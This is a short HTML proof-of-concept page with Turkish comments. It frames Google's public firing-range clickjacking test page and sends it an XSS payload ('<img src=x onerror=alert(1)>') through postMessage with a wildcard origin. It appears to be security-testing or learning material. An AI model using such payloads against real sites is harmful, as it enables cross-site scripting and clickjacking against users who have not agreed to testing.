<h2>Your Web Application Can be Mounted within an iFrame which makes it vulnerable to ClickJacking!</h2>

<script>
    var target = document.getElementById('target');
    target.addEventListener('load', function(){ // iframe yüklendiginde 
        var payload = {'html':'<img src=x onerror=alert(1)>'}; // bu payloadı karsı tarafa yolla (karsı tarafın bu veriyi ne yaptıgı onemli)
        target.contentWindow.postMessage(JSON.stringify(payload),'*');// Yukarıdaki veri post meesaage ile gider 

    })


    target.src = "https://public-firing-range.appspot.com/clickjacking/clickjacking_xfo_allowall";// targetimiz
    
</script>
